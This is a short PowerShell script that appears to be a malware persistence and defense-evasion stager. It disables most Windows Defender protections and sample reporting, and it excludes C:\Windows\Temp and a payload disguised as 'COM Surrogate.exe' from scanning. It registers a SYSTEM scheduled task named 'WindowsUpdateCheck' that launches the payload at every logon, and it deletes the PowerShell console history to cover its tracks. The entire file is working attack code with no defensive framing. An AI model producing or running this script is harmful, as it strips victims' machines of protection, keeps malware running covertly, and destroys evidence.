# === CONFIG ===
$originalPayload = "COM Surrogate.exe"  # EXE file with spaces
$stealthDir = "C:\Windows\Temp"
$payloadName = "COM Surrogate.exe"
$payloadPath = Join-Path $stealthDir $payloadName
$quotedPayloadPath = "`"$payloadPath`""  # Escape for safe use in command strings
$regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$entryName = "WinUpdateChecker"
$taskName = "WindowsUpdateCheck"

# === Disable Defender Features ===
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisablePrivacyMode $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -MAPSReporting 0

# === Exclude Payload from Defender ===
Add-MpPreference -ExclusionPath $stealthDir
Add-MpPreference -ExclusionProcess $payloadPath

# === Registry Persistence (quoted path) ===
#New-ItemProperty -Path $regKeyPath -Name $entryName -Value $quotedPayloadPath -PropertyType String -Force

# === Scheduled Task Persistence (quoted path) ===
$action = New-ScheduledTaskAction -Execute $payloadPath
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest -Force

# === Clear PowerShell History ===
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
